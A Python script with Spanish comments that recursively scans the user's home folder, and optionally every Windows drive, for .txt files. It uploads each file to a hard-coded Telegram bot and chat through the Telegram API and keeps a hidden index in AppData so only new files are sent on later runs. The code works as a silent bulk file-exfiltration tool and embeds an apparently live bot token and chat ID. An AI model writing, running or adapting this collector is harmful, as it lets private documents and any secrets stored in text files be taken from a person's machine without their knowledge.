import os
import sys
import json
import hashlib
from pathlib import Path
import requests
from typing import Iterable

# ===========================
#  CREDENCIALES DEL BOT
# ===========================
BOT_TOKEN = "6137879346:AAFbSSJmWCDFjgMqm7xxr7jjJmRh7z137GI"
CHAT_ID = "6623014135"

# ===========================
#  OPCIONES
# ===========================
# Límite de tamaño para enviar por Telegram (bots ~50 MB)
MAX_BYTES = 50 * 1024 * 1024

# Calcula hash del CONTENIDO para deduplicar (más preciso, más lento)
# Si lo pones en False, usa huella de (ruta, tamaño, mtime), más rápido pero menos robusto.
USE_CONTENT_HASH = True

# Buscar también en TODAS las unidades (C:\, D:\, etc.) además del perfil de usuario.
# ¡Úsalo con precaución! Podría tardar mucho y requerir permisos.
SEARCH_WHOLE_DRIVES = False

# Extensiones a incluir (minúsculas)
INCLUDE_EXTS = {".txt"}

# ===========================
#  RUTAS Y UTILIDADES
# ===========================
def get_appdata_dir() -> Path:
    # Windows: %APPDATA% -> p.ej. C:\Users\Usuario\AppData\Roaming
    # macOS/Linux fallback: ~/.telegram_txt_sender
    appdata = os.getenv("APPDATA")
    if appdata:
        base = Path(appdata) / "TelegramTxtSender"
    else:
        base = Path.home() / ".telegram_txt_sender"
    base.mkdir(parents=True, exist_ok=True)
    return base

APP_DIR = get_appdata_dir()
INDEX_PATH = APP_DIR / "sent_index.jsonl"  # un registro por línea con {"hash": "...", "path": "..."}
LOG_PATH = APP_DIR / "last_run.log"

def log(msg: str):
    try:
        with LOG_PATH.open("a", encoding="utf-8") as f:
            f.write(msg + "\n")
    except Exception:
        pass
    print(msg)

def iter_user_profile_dirs() -> Iterable[Path]:
    """
    Recorre recursivamente el PERFIL DE USUARIO (home).
    Excluye carpetas problemáticas/sensibles donde no tiene sentido buscar .txt
    """
    home = Path.home()

    # Carpetas a excluir (en minúsculas y como rutas absolutas)
    excludes = set()

    # Excluye la carpeta donde guardamos el índice y logs
    excludes.add(str(APP_DIR.resolve()).lower())

    # En Windows, excluye AppData completo (suele ser enorme y con permisos)
    appdata_env = os.getenv("APPDATA")
    if appdata_env:
        excludes.add(str(Path(appdata_env).resolve().lower()))
        # También Local/AppData/LocalLow si existen
        local_appdata = os.getenv("LOCALAPPDATA")
        if local_appdata:
            excludes.add(str(Path(local_appdata).resolve().lower()))

    # Otras exclusiones comunes (ajusta si hace falta)
    common_excludes = [
        ".cache", ".config", ".local", ".venv", "node_modules",
        "venv", "env", "__pycache__", ".git"
    ]

    def is_excluded(p: Path) -> bool:
        p_str = str(p.resolve()).lower()
        if any(p_str.startswith(ex) for ex in excludes):
            return True
        # Excluir por nombre de carpeta en cualquier nivel
        parts = [part.lower() for part in p.parts]
        return any(name in parts for name in common_excludes)

    # Recorre el home
    for root, dirs, files in os.walk(home, topdown=True):
        root_path = Path(root)
        # Filtra dirs in-place para que os.walk no entre
        dirs[:] = [d for d in dirs if not is_excluded(root_path / d)]
        yield root_path, files

def iter_all_drives() -> Iterable[Path]:
    """
    Itera por las unidades disponibles en Windows (C:\, D:\, …) y las recorre.
    Excluye Windows, Program Files, ProgramData, etc. para no perder tiempo/permisos.
    En macOS/Linux podrías listar /Volumes o /, pero no es recomendable.
    """
    import string
    drives = []
    if os.name == "nt":
        for letter in string.ascii_uppercase:
            d = Path(f"{letter}:/")
            if d.exists():
                drives.append(d)

    excludes_roots = {"windows", "program files", "program files (x86)", "programdata", "$recycle.bin", "system volume information"}

    for drive in drives:
        for root, dirs, files in os.walk(drive, topdown=True):
            root_path = Path(root)
            # Excluir raíces grandes/sensibles por nombre
            dirs[:] = [d for d in dirs if d.lower() not in excludes_roots]
            yield root_path, files

def file_fingerprint(path: Path) -> str:
    """
    Huella única del archivo. Si USE_CONTENT_HASH=True, hash SHA-256 del contenido.
    Si no, hash de (ruta absoluta, tamaño, mtime).
    """
    if USE_CONTENT_HASH:
        try:
            h = hashlib.sha256()
            with path.open("rb") as f:
                for chunk in iter(lambda: f.read(1024 * 1024), b""):
                    h.update(chunk)
            return "sha256:" + h.hexdigest()
        except Exception:
            # Si no se puede leer, vuelve a fingerprint rápido
            pass
    try:
        stat = path.stat()
        raw = f"{str(path.resolve())}|{stat.st_size}|{int(stat.st_mtime)}".encode("utf-8", errors="ignore")
        return "fast:" + hashlib.sha1(raw).hexdigest()  # rápido, suficiente para evitar duplicados básicos
    except Exception:
        # Último recurso: ruta sola
        return "path:" + hashlib.md5(str(path.resolve()).encode("utf-8", errors="ignore")).hexdigest()

def load_sent_index() -> set:
    seen = set()
    if INDEX_PATH.exists():
        with INDEX_PATH.open("r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    obj = json.loads(line)
                    h = obj.get("hash")
                    if h:
                        seen.add(h)
                except Exception:
                    continue
    return seen

def append_to_index(file_hash: str, path: Path):
    try:
        with INDEX_PATH.open("a", encoding="utf-8") as f:
            f.write(json.dumps({"hash": file_hash, "path": str(path)}) + "\n")
    except Exception:
        pass

def enviar_documento(bot_token: str, chat_id: str, ruta: Path) -> dict:
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    with ruta.open("rb") as f:
        files = {"document": (ruta.name, f)}
        data = {"chat_id": chat_id, "caption": f"Archivo: {ruta.name}"}
        r = requests.post(url, data=data, files=files, timeout=90)

    if not r.ok:
        try:
            log(f"Detalle Telegram: {r.json()}")
        except Exception:
            log(f"Detalle Telegram (raw): {r.text}")
        r.raise_for_status()
    return r.json()

def should_skip(path: Path) -> bool:
    try:
        if not path.is_file():
            return True
        if path.suffix.lower() not in INCLUDE_EXTS:
            return True
        size = path.stat().st_size
        if size <= 0 or size > MAX_BYTES:
            return True
        # Evita enviar el índice/logs del propio programa por accidente
        if APP_DIR in path.parents:
            return True
    except Exception:
        return True
    return False

def scan_sources() -> Iterable[Path]:
    # 1) Perfil de usuario (home)
    for root_path, files in iter_user_profile_dirs():
        for name in files:
            p = root_path / name
            if not should_skip(p):
                yield p

    # 2) (Opcional) Todas las unidades
    if SEARCH_WHOLE_DRIVES and os.name == "nt":
        for root_path, files in iter_all_drives():
            for name in files:
                p = root_path / name
                if not should_skip(p):
                    yield p

def main():
    # Validación básica
    if not BOT_TOKEN or not CHAT_ID:
        log("Faltan BOT_TOKEN o CHAT_ID.")
        sys.exit(1)

    sent = load_sent_index()
    encontrados = 0
    enviados = 0
    fallidos = 0

    to_send = []

    # Recolecta candidatos
    for path in scan_sources():
        try:
            h = file_fingerprint(path)
        except Exception:
            continue
        if h in sent:
            continue
        to_send.append((path, h))

    if not to_send:
        log("No hay archivos nuevos para enviar.")
        return

    log(f"Se enviarán {len(to_send)} archivo(s) .txt (máx {MAX_BYTES // (1024*1024)} MB) desde el perfil de usuario.")
    for path, h in to_send:
        encontrados += 1
        try:
            resp = enviar_documento(BOT_TOKEN, CHAT_ID, path)
            if resp.get("ok"):
                enviados += 1
                append_to_index(h, path)
                log(f"✅ Enviado: {path}")
            else:
                fallidos += 1
                log(f"⚠️ Falló: {path} -> {resp}")
        except Exception as e:
            fallidos += 1
            log(f"❌ Error enviando {path}: {e}")

    log(f"\nResumen: {enviados} enviados, {fallidos} fallidos, {encontrados} considerados.")

if __name__ == "__main__":
    main()
